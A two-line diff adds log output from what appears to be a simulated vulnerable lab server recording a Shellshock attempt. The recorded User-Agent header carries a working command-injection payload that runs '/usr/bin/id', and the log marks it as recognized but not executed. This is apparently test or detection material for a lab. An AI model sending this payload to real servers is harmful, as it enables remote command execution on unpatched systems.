@@ -1,0 +1,2 @@
+[vulnerable-target] listening: {"host": "10.230.31.30", "port": 80, "virtual_hosts": ["vuln.lab"], "command_execution": false}
+[vulnerable-target] shellshock_request: {"client": ["172.22.0.1", 58997], "method": "GET", "path": "/cgi-bin/status", "headers": {"User-Agent": "() { :;}; echo; /usr/bin/id", "Host": "vuln.lab", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"}, "recognized": true, "command_executed": false}
